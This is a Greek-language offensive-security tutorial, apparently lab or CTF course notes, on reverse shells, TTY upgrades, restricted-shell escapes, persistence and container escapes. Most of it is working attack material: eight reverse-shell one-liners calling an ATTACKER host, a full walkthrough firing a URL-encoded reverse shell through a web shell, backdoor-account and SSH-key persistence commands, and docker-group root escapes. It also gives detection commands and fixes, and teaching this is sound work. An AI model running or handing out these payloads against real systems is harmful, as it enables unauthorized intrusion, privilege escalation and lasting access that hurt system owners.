## 1. Reverse shell έναντι bind shell

| | **Bind shell** | **Reverse shell** |
| --- | --- | --- |
| **Ποιος ακούει;** | **Ο στόχος** ανοίγει θύρα και περιμένει | **Εσείς** ανοίγετε θύρα και περιμένετε |
| **Ποιος συνδέεται;** | Εσείς → στόχος | Στόχος → εσείς |
| **Μπλοκάρεται από** | **Firewall του στόχου (εισερχόμενα)** | Τον δικό σας firewall (σπάνια πρόβλημα) |
| **Πρακτικό;** | Σπάνια | **Σχεδόν πάντα** |
| **Θύρα** | Οποιαδήποτε στον στόχο | **>1024 σε εσάς** (αλλιώς χρειάζεστε root) |

> ### 📖 Σύνοψη — Γιατί τα reverse shells κυριαρχούν
>
> **Το φίλτρο εισερχομένων είναι πολύ συνηθέστερο από το φίλτρο εξερχομένων.** Ένας
> εξυπηρετητής που δεν μπορεί να κάνει **καμία** εξερχόμενη σύνδεση δεν μπορεί ούτε να πάρει
> ενημερώσεις, ούτε να μιλήσει σε API, ούτε να στείλει email. Άρα σχεδόν κάθε σύστημα επιτρέπει
> **κάποια** έξοδο — και ένα reverse shell χρησιμοποιεί ακριβώς αυτήν.
>
> **Ο αμυντικός έλεγχος:** egress filtering. Αν ο web εξυπηρετητής δεν μπορεί να συνδεθεί
> πουθενά έξω, το reverse shell **δεν δουλεύει**. Αυτή είναι η πιο υποτιμημένη άμυνα σε αυτή
> τη διαδρομή.

## 2. Ανατομία ενός reverse shell

**Κάθε reverse shell, σε κάθε γλώσσα, είναι τρία βήματα:**

```text
1. ΣΥΝΔΕΣΗ     → άνοιξε TCP socket προς τον επιτιθέμενο
2. ΑΝΑΚΑΤΕΥΘΥΝΣΗ → σύνδεσε τα stdin/stdout/stderr στο socket
3. ΕΚΤΕΛΕΣΗ    → τρέξε ένα κέλυφος
```

Αν καταλάβετε αυτά τα τρία, **δεν χρειάζεται να αποστηθίσετε κανένα payload** — μπορείτε να το
γράψετε σε οποιαδήποτε γλώσσα έχει sockets.

### 2.1 Οι file descriptors

| FD | Όνομα | Τι είναι |
| --- | --- | --- |
| **0** | stdin | **Από πού διαβάζει** το πρόγραμμα (το πληκτρολόγιό σας) |
| **1** | stdout | **Πού γράφει** την κανονική έξοδο (η οθόνη σας) |
| **2** | stderr | **Πού γράφει** τα σφάλματα |

Ένα reverse shell **αντικαθιστά και τα τρία** με το socket. Γι' αυτό οι πληκτρολογήσεις σας
φτάνουν στο κέλυφος και η έξοδός του φτάνει σε εσάς.

### 2.2 Τα οκτώ payloads που πρέπει να αναγνωρίζετε

```bash
# 1. Bash μέσω /dev/tcp — το πιο συνηθισμένο σε CTF
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# 2. Bash με mkfifo — όταν το /dev/tcp δεν υπάρχει
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 4444 > /tmp/f

# 3. Netcat με -e (μόνο σε παραδοσιακό netcat, όχι στο ncat του Kali)
nc ATTACKER 4444 -e /bin/bash

# 4. Netcat χωρίς -e — με mkfifo
nc ATTACKER 4444 -c

# 5. Python 3
python3 -c 'import socket,os,subprocess;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# 6. Perl
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# 7. PHP
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# 8. Socat — το πιο ισχυρό (πλήρες TTY από την αρχή)
socat file:`tty`,raw,echo=0 tcp-listen:4444        # στον επιτιθέμενο
socat tcp-connect:ATTACKER:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane   # στον στόχο
```

**Ποιο να διαλέξετε:** ελέγξτε πρώτα **τι υπάρχει στον στόχο**:

```bash
for b in bash sh python python3 perl nc ncat socat curl wget gcc; do command -v $b; done
```

```text
/bin/bash
/bin/sh
/usr/bin/python3
/usr/bin/perl
/usr/bin/curl
/usr/bin/wget
```

**Κανένα `nc`, κανένα `socat`.** Άρα: **bash `/dev/tcp`** ή **python3**. Αυτός ο έλεγχος των 2
δευτερολέπτων σας γλιτώνει 20 λεπτά αποτυχημένων payloads.

### 2.3 Ανάλυση του bash payload — όρος προς όρο

```bash
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

| Όρος | Τι σημαίνει |
| --- | --- |
| `bash` | Το κέλυφος. **Πρέπει να υπάρχει** — το `/dev/tcp` είναι **χαρακτηριστικό του bash**, όχι του POSIX `sh` |
| **`-i`** | **interactive** — δίνει prompt, job control, ιστορικό. Χωρίς αυτό, το `Ctrl+C` συμπεριφέρεται παράξενα |
| **`>&`** | **Ανακατεύθυνση stdout ΚΑΙ stderr** στο socket |
| `/dev/tcp/HOST/PORT` | **Εικονική συσκευή του bash** — το άνοιγμά της δημιουργεί TCP σύνδεση. **Δεν υπάρχει στο δίσκο** |
| **`0>&1`** | **stdin → εκεί που πάει το stdout** (δηλαδή το socket) |

**Αν παραλείψετε το `0>&1`**, το κέλυφος **εκτελεί** εντολές αλλά **δεν δέχεται είσοδο** —
βλέπετε το banner και μετά τίποτα. Αυτό είναι το πιο συχνό σύμπτωμα «μισού» shell.

### 2.4 Ο κύκλος του mkfifo

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER 4444 > /tmp/f
```

**Γιατί χρειάζεται.** Το `nc` **δεν** συνδέει το stdin/stdout μιας διεργασίας απευθείας — δεν
έχει `-e` στην έκδοση του Kali (ncat). Λύση: ένας **σωλήνας δύο κατευθύνσεων** μέσω ενός
**named pipe**:

```text
   /tmp/f  ──cat──►  /bin/sh  ──2>&1──►  nc  ──►  ATTACKER:4444
      ▲                                        │
      └──────────────── nc > /tmp/f ───────────┘
```

Το `cat /tmp/f` διαβάζει ό,τι μπαίνει στο pipe· το `/bin/sh -i` το εκτελεί· το `nc` το στέλνει
έξω· και η έξοδος του `nc` **επιστρέφει στο ίδιο pipe**. **Κύκλος = διαδραστικότητα.**

**Το `rm /tmp/f` πρώτα είναι υποχρεωτικό** — αν το pipe υπάρχει από προηγούμενη προσπάθεια, το
`mkfifo` αποτυγχάνει με `File exists`.

### 2.5 Το socat — γιατί είναι ανώτερο

```bash
socat tcp-connect:ATTACKER:4444 exec:/bin/bash,pty,stderr,setsid,sigint,sane
```

| Επιλογή | Τι κάνει |
| --- | --- |
| **`pty`** | **Δημιουργεί ψευδο-τερματικό αμέσως** — χωρίς τα 4 βήματα αναβάθμισης |
| **`stderr`** | Ανακατευθύνει **και** το stderr |
| **`setsid`** | **Νέα συνεδρία** — το κέλυφος επιζεί αν πεθάνει ο γονέας |
| **`sigint`** | **Διαβιβάζει το Ctrl+C** στη μακρινή διεργασία, όχι στον socat |
| **`sane`** | **Κανονικοποιεί το τερματικό** (echo, newline handling) |

**Ένα socat reverse shell είναι πλήρως λειτουργικό από το πρώτο δευτερόλεπτο:** `Ctrl+C`
σκοτώνει τη **μακρινή** εντολή, το `sudo` ζητάει κωδικό κανονικά, το `vim` δουλεύει, το `top`
εμφανίζεται σωστά. **Αν υπάρχει socat στον στόχο, χρησιμοποιήστε το.**

## 3. Αναβάθμιση σε πραγματικό TTY — τα 4 βήματα

### 3.1 Γιατί το χρειάζεστε

Ένα ακατέργαστο (raw) `nc` shell είναι **ανάπηρο με τέσσερις τρόπους:**

| Πρόβλημα | Σύμπτωμα |
| --- | --- |
| **Χωρίς TTY** | `sudo: no tty present` · `su: must be run from a terminal` · `vim` ανοίγει αλλά δεν λειτουργεί |
| **Χωρίς job control** | Δεν μπορείτε να βάλετε διεργασία σε background |
| **Χωρίς επεξεργασία γραμμής** | **Τα βελάκια τυπώνουν `^[[A`**, το Tab δεν συμπληρώνει |
| **Λάθος Ctrl+C** | **Σκοτώνει τον ΑΚΡΟΑΤΗ ΣΑΣ, όχι τη μακρινή εντολή** — και χάνετε το shell |

**Το τελευταίο είναι το πιο καταστροφικό.** Ένας αρχάριος πατάει `Ctrl+C` για να σταματήσει ένα
`find` που τρέχει πολύ, και **χάνει ολόκληρη τη σύνδεση**.

### 3.2 Η διαδικασία

```bash
# ΣΤΟ ΣΤΟΧΟ:
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Τώρα πατήστε Ctrl+Z  (το shell πάει στο παρασκήνιο, στον Kali σας)

# ΣΤΟΝ KALI:
stty raw -echo; fg
# Πατήστε Enter δύο φορές

# ΣΤΟ ΣΤΟΧΟ:
export TERM=xterm
stty rows 40 cols 160
```

**Τι κάνει κάθε βήμα:**

| Βήμα | Μηχανισμός |
| --- | --- |
| **`pty.spawn()`** | **Δημιουργεί ψευδο-τερματικό** — ένα αντικείμενο του πυρήνα που συμπεριφέρεται σαν πραγματικό teletype. **Αυτό είναι που κάνει το `sudo` και το `vim` να δουλεύουν.** Επιπλέον **επανα-πατρώνει** το bash πάνω στο pty, ξεγελώντας κάθε έλεγχο `isatty()` |
| **`Ctrl+Z`** | **Αναστέλλει** τον τοπικό `nc` (SIGTSTP) ώστε να τρέξετε εντολές στον Kali |
| **`stty raw -echo`** | Το **τοπικό** τερματικό παύει να ερμηνεύει πλήκτρα (`raw`) και παύει να τα εμφανίζει (`-echo`) — **η μακρινή πλευρά κάνει πλέον την εμφάνιση**. **Αυτό κάνει το `Ctrl+C` να φτάνει στη μακρινή διεργασία** |
| **`fg`** | **Επαναφέρει** τον `nc` στο προσκήνιο |
| **Enter ×2** | Ο ακροατής δεν εμφανίζει prompt μετά το `fg` — φαίνεται σαν να κρέμασε. **Δεν κρέμασε.** |
| **`export TERM=xterm`** | Λέει στις εφαρμογές **ποιες ακολουθίες ελέγχου** να στέλνουν (βελάκια, χρώματα) |
| **`stty rows 40 cols 160`** | Λέει στο μακρινό pty τις **διαστάσεις** σας, ώστε το `less` και το `top` να μην αναδιπλώνονται σε σκουπίδια |

> **Κάντε το ΑΜΕΣΩΣ μετά από κάθε shell.** Το να προσπαθείτε να τρέξετε `su` ή `sudo -l` σε
> μη-αναβαθμισμένο shell είναι **ο πιο συνηθισμένος τρόπος να συμπεράνετε λανθασμένα ότι μια
> διαδρομή δεν λειτουργεί.** Στο Μηχάνημα 4 (DC-2), το `su jerry` αποτυγχάνει **μόνο** λόγω
> έλλειψης TTY.

### 3.3 Εναλλακτικές όταν δεν υπάρχει python

```bash
script -q /dev/null -c /bin/bash          # χρησιμοποίησε το `script`
/usr/bin/expect -c 'spawn /bin/bash; interact'
socat file:`tty`,raw,echo=0 tcp-listen:4444   # αν υπάρχει socat
perl -e 'exec "/bin/bash";'               # μέσω perl
```

Το **`script -q /dev/null -c /bin/bash`** είναι η καλύτερη εναλλακτική: το `script` είναι
σχεδόν πάντα εγκατεστημένο και δημιουργεί pty από μόνο του.

## 4. Περιορισμένα κελύφη (rbash) και διαφυγή

### 4.1 Τι είναι το rbash

**`rbash` = restricted bash.** Περιορίζει:

| Περιορισμός | Τι μπλοκάρει |
| --- | --- |
| `cd` | **Αλλαγή καταλόγου** |
| `PATH` | **Ορισμός ή αποδέσμευση** των `PATH`, `SHELL`, `ENV`, `BASH_ENV` |
| **`/`** | **Οποιαδήποτε εντολή που περιέχει κάθετο** (`/bin/ls` → μπλοκαρισμένο) |
| **`>`, `>>`, `<`** | **Ανακατεύθυνση εξόδου** |
| `exec` | Αντικατάσταση του κελύφους |
| `.` / `source` | Φόρτωση αρχείων |
| Ονόματα με `-` | Εντολές που αρχίζουν με παύλα |

### 4.2 Επιβεβαιώστε πριν προσπαθήσετε να ξεφύγετε

```bash
echo $0
echo $SHELL
set -o | grep restricted
echo $PATH
ls -la /bin/rbash
```

```text
-rbash
/bin/rbash
restricted        on
/home/tom/usr/bin
```

**Μην μαντεύετε.** Το `whoami: command not found` μπορεί να είναι rbash, μπορεί να είναι
κατεστραμμένο PATH, μπορεί να είναι container χωρίς coreutils. **Οι τέσσερις παραπάνω εντολές
δίνουν την απάντηση σε 5 δευτερόλεπτα.**

**Το `PATH=/home/tom/usr/bin` είναι η πιο πληροφοριακή γραμμή:** δείχνει ότι ο χρήστης έχει
**έναν κατάλογο με ελάχιστα, επιλεγμένα εργαλεία**. Δείτε τι υπάρχει μέσα:

```bash
ls /home/tom/usr/bin/
```

```text
cat  echo  grep  less  ls  vi
```

**Αυτή η λίστα είναι και η λίστα διαφυγής σας.** Αν υπάρχει **`vi`**, **`less`**, **`more`**,
**`man`**, **`find`**, **`awk`**, **`python`** ή **`perl`**, έχετε διαφυγή.

### 4.3 Οι διαφυγές — με σειρά προτίμησης

```bash
# 1. ΔΟΚΙΜΑΣΤΕ ΠΡΩΤΟ: αν ο περιορισμός έρχεται από .bashrc και όχι από το binary
bash --noprofile --norc

# 2. vi / vim → :set shell=/bin/bash → :shell
# 3. less / more / man → !/bin/sh
# 4. find → -exec /bin/sh \;
# 5. awk → BEGIN{system("/bin/sh")}
# 6. python/perl → os.system('/bin/sh')
# 7. scp → -S πρόγραμμα
# 8. ssh → ssh user@host (από μέσα!) με Command=
```

**Η διαφυγή `vi` στο Μηχάνημα 4:**

```text
vi
: set shell=/bin/bash
: shell
```

**Ο μηχανισμός είναι πιο σημαντικός από το κόλπο:** το **`rbash` περιορίζει ΜΙΑ διεργασία.**
Οποιοδήποτε πρόγραμμα που το rbash επιτρέπει να τρέξει, μπορεί να **γεννήσει** νέα διεργασία —
και η νέα διεργασία **δεν κληρονομεί** τον περιορισμό, γιατί ο περιορισμός είναι ιδιότητα του
*κελύφους*, όχι του χρήστη ή του πυρήνα.

**Ό,τι μπορεί να εκτελέσει το περιορισμένο κέλυφος, είναι μη περιορισμένο.** Αυτός είναι ο
λόγος που το rbash **δεν είναι ποτέ έλεγχος ασφαλείας** — είναι ευκολία.

### 4.4 Μετά τη διαφυγή — επιδιορθώστε το περιβάλλον

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
export SHELL=/bin/bash
unset BASH_ENV ENV
id; ls; sudo -l
```

**Αυτό το βήμα το ξεχνούν όλοι.** Μετά τη διαφυγή έχετε ένα **πραγματικό bash με ακρωτηριασμένο
`PATH`** — άρα `ls`, `id`, `sudo` δίνουν όλα **`command not found`**, που μοιάζει **ακριβώς** με
αποτυχημένη διαφυγή. **Ελέγξτε το `PATH` πριν συμπεράνετε οτιδήποτε.**

## 5. Εμμονή (persistence) — τι είναι και πώς ανιχνεύεται

**Εμμονή = η πρόσβασή σας επιζεί επανεκκίνησης, αποσύνδεσης, ή αλλαγής κωδικού.**

> **Σε αυτή τη διαδρομή δεν την χρειάζεστε** — τα μηχανήματα δεν επανεκκινούνται. Αλλά πρέπει
> να την **αναγνωρίζετε** (γιατί μερικά μηχανήματα την έχουν ήδη) και να **ξέρετε τι αφήνετε
> πίσω** σε πραγματικό έργο.

### 5.1 Τα επτά μέρη όπου ζει η εμμονή

| # | Μηχανισμός | Εντολή δημιουργίας | **Εντολή ανίχνευσης** |
| --- | --- | --- | --- |
| 1 | **SSH authorized_keys** | `cat key.pub >> ~/.ssh/authorized_keys` | `cat /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys` |
| 2 | **Cron** | `crontab -e` ή `/etc/cron.d/` | `crontab -l; ls -la /etc/cron.d/; cat /etc/crontab` |
| 3 | **systemd unit** | `/etc/systemd/system/x.service` | `systemctl list-units --type=service --all \| grep -v masked` |
| 4 | **Startup scripts** | `.bashrc`, `.profile`, `/etc/profile.d/` | `grep -rn 'nc\|bash -i\|curl' /etc/profile.d/ /home/*/.bashrc` |
| 5 | **SUID binary** | `chmod 4755 /tmp/rb` | `find / -perm -4000 -type f -newer /etc/os-release` |
| 6 | **Νέος χρήστης** | `useradd -u 0 -o -g 0 backdoor` | `awk -F: '$3==0 {print $1}' /etc/passwd` |
| 7 | **Init/rc scripts** | `/etc/rc.local`, `/etc/init.d/` | `cat /etc/rc.local` |

### 5.2 Ανίχνευση — η εντολή που πιάνει τα περισσότερα

```bash
awk -F: '$3==0 || $3>=1000 && $7 !~ /nologin|false/ {print $1, $3, $7}' /etc/passwd
```

```text
root 0 /bin/bash
ignite 0 /bin/bash          ← !!! ΔΥΟ λογαριασμοί με UID 0
hummingbirdscyber 1000 /bin/bash
```

**`awk -F:`** ορίζει διαχωριστή το `:` · **`$3==0`** = UID 0 · **`$7`** = το shell.
**Δύο γραμμές με UID 0 = ένας λογαριασμός backdoor.** Αυτή είναι η **πρώτη** εντολή που πρέπει
να τρέξετε ως αμυνόμενος μετά από ένα περιστατικό.

### 5.3 Η πιο κοινή εμμονή — SSH key

```bash
# Δημιουργία
ssh-keygen -t ed25519 -f labkey -N ''
cat labkey.pub >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
chmod 700 /home/user/.ssh
ssh -i labkey user@TARGET
```

| Όρος | Σημασία |
| --- | --- |
| `-t ed25519` | **Σύγχρονος αλγόριθμος** — μικρότερο, ταχύτερο, ασφαλέστερο από RSA |
| `-f labkey` | Όνομα αρχείου |
| **`-N ''`** | **Κενό passphrase.** Τα εισαγωγικά είναι υποχρεωτικά — χωρίς αυτά ρωτάει διαδραστικά |
| **`chmod 600`** | **Απαραίτητο.** Το SSH **αρνείται** κλειδιά με χαλαρά δικαιώματα και λέει `Permissions 0644 … are too open` |
| **`chmod 700`** | Για τον κατάλογο `.ssh` |

**Γιατί είναι τόσο δημοφιλής:** δεν αλλάζει κανένα αρχείο συστήματος, δεν εμφανίζεται σε cron
ούτε σε services, **λειτουργεί μετά από επανεκκίνηση**, και αν ο διαχειριστής αλλάξει τον
κωδικό του χρήστη **η πρόσβαση παραμένει**.

## 6. Ανίχνευση και διαφυγή από container

### 6.1 Πώς ξέρετε ότι είστε σε container

```bash
ls -la /.dockerenv
cat /proc/1/cgroup
cat /proc/self/status | grep -i cap
hostname
cat /proc/version
ip a
```

| Έλεγχος | Σε container | Σε πραγματικό ξενιστή |
| --- | --- | --- |
| **`/.dockerenv`** | **Υπάρχει** (0 bytes) | Δεν υπάρχει |
| **`/proc/1/cgroup`** | `/docker/<64-hex-id>` | `/` ή `init.scope` |
| **PID 1** | `sh`, `bash`, ή η εφαρμογή | **`systemd` ή `init`** |
| **`CapEff`** | `00000000a80425fb` (περιορισμένο) | **`0000003fffffffff`** (πλήρες) |
| **`hostname`** | **12 δεκαεξαδικοί χαρακτήρες** | Πραγματικό όνομα |
| **`ip a`** | Μία μόνο διεπαφή, συχνά `eth0` σε `172.17.x.x` | Πολλές, με πραγματικές διευθύνσεις |
| **`/proc/cpuinfo`** | Λίγοι πυρήνες | Όλοι |
| **`dmesg`** | Συχνά **απαγορευμένο** | Διαβάσιμο |

```text
-rw-r--r-- 1 root root 0 Jan 12  2019 /.dockerenv
```
```text
1:memory:/docker/0d8f1c2b3a4e2f7b8c9d0a1b2c3d4e5f…
```
```text
CapEff: 00000000a80425fb
```

**Το `CapEff` είναι η πιο τεχνική απόδειξη.** Οι τιμές `a80425fb` είναι το **προεπιλεγμένο
σύνολο της Docker** — περίπου 14 capabilities. Ένα μη περιορισμένο root έχει
**`0000003fffffffff`** — όλα τα 41. Αν δείτε τη μικρή τιμή, **είστε σε container**.

### 6.2 Γιατί «root στο container» δεν είναι root

**Ένα container είναι μια επικάλυψη (overlay) αρχείων πάνω από μια εικόνα.** Ό,τι κάνατε,
έγινε σε ένα sandbox που μπορεί να διαγραφεί με `docker rm`. Ο **πυρήνας** είναι κοινός, αλλά
το **σύστημα αρχείων** όχι.

Το Μηχάνημα 13 το διδάσκει ρητά: γίνεστε root μέσα στο container, διαβάζετε ένα
`/root/flag.txt` που λέει «συγχαρητήρια, είστε root… αλλά αυτό δεν είναι το τέλος» — **είναι
ψεύτικη σημαία**. Ο πραγματικός στόχος είναι ο **οικοδεσπότης**.

### 6.3 Οι τέσσερις διαφυγές

| # | Διαφυγή | Έλεγχος | Εντολή |
| --- | --- | --- | --- |
| 1 | **Ομάδα `docker`** | `id` → `groups=…,999(docker)` | `docker run -v /:/host --rm -it alpine chroot /host sh` |
| 2 | **Ομάδα `lxd`** | `id` → `110(lxd)` | `lxc init … -c security.privileged=true` + `disk source=/` |
| 3 | **`--privileged` container** | `CapEff: 0000003fffffffff` | `mount /dev/sda1 /mnt` |
| 4 | **Διαμοντούμενος `/var/run/docker.sock`** | `ls -l /var/run/docker.sock` | `curl --unix-socket /var/run/docker.sock http://localhost/containers/json` |

**Η διαφυγή #1 είναι η πιο συνηθισμένη σε CTF και σε πραγματικά συστήματα.**

```bash
ls -l /var/run/docker.sock
getent group docker
```

```text
srw-rw---- 1 root docker 0 May  4 10:02 /var/run/docker.sock
docker:x:999:hummingbirdscyber
```

**Διαβάστε τα δύο μαζί — αυτό είναι η επίθεση.** Το `/var/run/docker.sock` είναι **Unix domain
socket**, mode **`srw-rw----`**, κάτοχος **`root:docker`**. Η ιδιότητα **μέλους της ομάδας
`docker`** δίνει **εγγραφή στο API του daemon**. Ο daemon τρέχει **ως root**. Άρα όποιος μιλάει
σε αυτό το socket μπορεί να ζητήσει **container με το `/` του οικοδεσπότη προσαρτημένο**.

**Δεν υπάρχει nuance:** `docker`, `lxd`, `libvirt`, `disk` = **root**.

### 6.4 Πώς να το διορθώσετε (για την αναφορά σας)

```bash
# Rootless Docker — ο daemon τρέχει ως χρήστης
dockerd-rootless-setuptool.sh install

# Ή rootless Podman — χωρίς daemon καθόλου
podman run -v /:/host -it alpine    # αποτυγχάνει: μόνο τα αρχεία του χρήστη

# Ανίχνευση
getent group docker lxd libvirt disk
grep -rl 'docker.sock' /etc/systemd/ 2>/dev/null
```

**Ποτέ μην βάζετε λογαριασμό υπηρεσίας (web, βάσης) σε ομάδα container.** Αν μια εφαρμογή
πραγματικά πρέπει να εκκινεί containers, δώστε της **περιορισμένο API token** σε έναν
μεσολαβητή.

### 7.2 Η λίστα καθαρισμού

| Τι | Εντολή |
| --- | --- |
| **Αρχεία στο `/tmp`** | `rm -f /tmp/rb /tmp/*.c /tmp/*.sh /tmp/of* /tmp/f` |
| **Αντίγραφα exploit** | `rm -f /home/*/ofs.c /home/*/exploit*` |

### 7.3 Επαλήθευση

```bash
ls -la /tmp /etc/ld.so.preload 2>/dev/null
grep -c ignite /etc/passwd
diff /opt/md5check.py /tmp/md5check.py.bak
```

**Ο καθαρισμός χωρίς επαλήθευση δεν είναι καθαρισμός.** Το `grep -c ignite /etc/passwd` πρέπει
να δώσει **`0`**· το `diff` δεν πρέπει να δώσει **καμία** διαφορά.

> **Το `/etc/ld.so.preload` είναι το πιο επικίνδυνο αντικείμενο στη λίστα.** Το overlayfs
> exploit (Μηχάνημα 2) το δημιουργεί. Αυτό το αρχείο **εισάγει μια βιβλιοθήκη σε κάθε
> δυναμικά συνδεδεμένη διεργασία του συστήματος** — αν το αφήσετε, το μηχάνημα μπορεί να μην
> εκκινήσει καν σωστά.

## 8. Έλεγχος γνώσεων

<details>
<summary><b>1.</b> Γιατί τα reverse shells χρησιμοποιούνται σχεδόν πάντα αντί για bind shells;</summary>

Επειδή **το φίλτρο εισερχομένων είναι πολύ συνηθέστερο από το φίλτρο εξερχομένων**. Ένας
εξυπηρετητής που δεν μπορεί να κάνει καμία εξερχόμενη σύνδεση δεν μπορεί να ενημερωθεί, να
μιλήσει σε API ή να στείλει email — άρα σχεδόν πάντα επιτρέπεται κάποια έξοδος. Το bind shell
απαιτεί ο στόχος να ανοίξει θύρα **προς τα μέσα**, που είναι ακριβώς αυτό που μπλοκάρει το
firewall.
</details>

<details>
<summary><b>2.</b> Τι κάνει το <code>0>&1</code> στο <code>bash -i >& /dev/tcp/X/4444 0>&1</code>, και τι συμβαίνει αν το παραλείψετε;</summary>

Στέλνει το **stdin (FD 0)** εκεί που πηγαίνει ήδη το stdout (FD 1) — δηλαδή στο socket. **Χωρίς
αυτό, το κέλυφος εκτελεί εντολές αλλά δεν δέχεται είσοδο**: βλέπετε το banner, και μετά τίποτα
δεν ανταποκρίνεται. Είναι το σύμπτωμα ενός «μισού» shell.
</details>

<details>
<summary><b>3.</b> Γιατί το <code>Ctrl+C</code> σε ένα μη αναβαθμισμένο shell είναι καταστροφικό;</summary>

Επειδή ο **τοπικός** σας τερματικός σταθμός ερμηνεύει το `Ctrl+C` και στέλνει SIGINT **στον
τοπικό `nc`** — δηλαδή **σκοτώνει τον ακροατή σας** — αντί να το διαβιβάσει στη μακρινή
διεργασία. Το `stty raw -echo` κάνει το τοπικό τερματικό να περνά τα πλήκτρα **χωρίς
ερμηνεία**, οπότε το SIGINT φτάνει στο μακρινό κέλυφος.
</details>

<details>
<summary><b>4.</b> Γιατί το rbash δεν είναι έλεγχος ασφαλείας;</summary>

Επειδή **περιορίζει μία διεργασία**. Οτιδήποτε το rbash επιτρέπει να εκτελεστεί μπορεί να
**γεννήσει** νέα διεργασία, και η νέα διεργασία δεν κληρονομεί τον περιορισμό — ο περιορισμός
είναι ιδιότητα του κελύφους, όχι του χρήστη ή του πυρήνα. Ένα `vi` με `:shell`, ένα `less` με
`!`, ή ένα `find -exec` δίνουν όλα ένα πλήρες κέλυφος.
</details>

<details>
<summary><b>5.</b> Πώς διακρίνετε ένα container από έναν πραγματικό ξενιστή, με τρεις ελέγχους;</summary>

(α) **`cat /proc/1/cgroup`** → `/docker/<hex>` = container· `/` ή `init.scope` = ξενιστής.
(β) **`hostname`** → 12 δεκαεξαδικοί χαρακτήρες = container ID.
(γ) **`grep CapEff /proc/self/status`** → `00000000a80425fb` = περιορισμένο σύνολο Docker·
`0000003fffffffff` = πλήρη δικαιώματα. Επιπλέον: `/.dockerenv` υπάρχει μόνο σε containers.
</details>

<details>
<summary><b>6.</b> Γιατί η ομάδα <code>docker</code> είναι ισοδύναμη με root;</summary>

Τα μέλη της έχουν **εγγραφή στο `/var/run/docker.sock`** (mode `srw-rw----`, `root:docker`).
Αυτό το socket είναι το **API του Docker daemon**, και **ο daemon τρέχει ως root**. Άρα μπορείτε
να του ζητήσετε να εκκινήσει container με **`-v /:/host`** — το σύστημα αρχείων του οικοδεσπότη
προσαρτημένο — και από εκεί να γράψετε στο `/etc/passwd` ή να κάνετε `chroot /host`.
</details>

<details>
<summary><b>7.</b> Ποια εντολή ανιχνεύει λογαριασμούς backdoor με UID 0;</summary>

```bash
awk -F: '$3==0 {print $1}' /etc/passwd
```

Κάθε γραμμή με **UID 0 είναι root**. Σε ένα υγιές σύστημα υπάρχει **μία** (`root`). Δύο ή
περισσότερες = backdoor. Αυτή είναι η πρώτη εντολή απόκρισης σε περιστατικό.
</details>

## 9. Σημειωμένες εντολές

### 9.1 `nc` ως ακροατής — όρος προς όρο

```bash
nc -lvnp 4444
```

| Όρος | Σημασία |
| --- | --- |
| `-l` | **listen** — άκου, αντί να συνδεθείς |
| `-v` | **verbose** — τύπωσε τι έγινε (χωρίς αυτό, δεν βλέπετε τη σύνδεση) |
| `-n` | **χωρίς ανάλυση DNS** — πιο γρήγορο, και αποφεύγει διαρροή DNS |
| `-p 4444` | **Η θύρα μου** |

```text
Ncat: Version 7.94 ( https://nmap.org/ncat )
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101:52114.
www-data@target:/var/www/html$
```

**Ανάγνωση:**
- **`Listening on 0.0.0.0:4444`** — το `0.0.0.0` σημαίνει **όλες οι διεπαφές**. Αν έλεγε
  `127.0.0.1`, **ο στόχος δεν θα μπορούσε να σας φτάσει**.
- **`Connection from 192.168.56.101:52114`** — **η επιβεβαίωσή σας.** Η διεύθυνση του **στόχου**
  και η **εφήμερη θύρα** του (πάνω από 49152, όπως πρέπει).
- Αν δείτε μόνο το `Listening on…` και ποτέ το `Connection from…`, το πρόβλημα είναι ένα από
  τρία: **λάθος `LHOST`** (χρησιμοποιήσατε την IP του Wi-Fi αντί για το host-only),
  **firewall** στον στόχο, ή **το payload δεν εκτελέστηκε** (URL-encoding!).

**Πριν ακούσετε, ελέγξτε ότι η θύρα είναι ελεύθερη:**

```bash
ss -tulnp | grep 4444
```

Αν κάτι άλλο την κατέχει, το `nc` αποτυγχάνει με `Address already in use` — και πολλοί
νομίζουν ότι το payload είναι λάθος.

### 9.2 Ο πλήρης κύκλος ενός reverse shell

```bash
# ΒΗΜΑ 1 — στον Kali: ακούστε ΠΡΩΤΑ
nc -lvnp 4444

# ΒΗΜΑ 2 — ελέγξτε τι υπάρχει στον στόχο
for b in bash sh python python3 perl nc socat curl; do command -v $b; done

# ΒΗΜΑ 3 — παράγετε το URL-encoded payload
python3 -c "import urllib.parse as u; print(u.quote(\"bash -c 'bash -i >& /dev/tcp/192.168.56.10/4444 0>&1'\"))"
```

```text
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.10%2F4444%200%3E%261%27
```

```bash
# ΒΗΜΑ 4 — πυροδοτήστε
curl "http://TARGET/shell.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.10%2F4444%200%3E%261%27"
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.101:52114.
www-data@target:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Η σειρά είναι κρίσιμη.** Αν πυροδοτήσετε **πριν** ακούσετε, το payload **καταναλώνεται** —
συνδέεται στο πουθενά και τελειώνει. Όταν ξαναπυροδοτήσετε αργότερα, φαίνεται σαν να μην
δουλεύει, ενώ στην πραγματικότητα **δουλεύει μια χαρά** — απλώς δεν υπήρχε ακροατής.

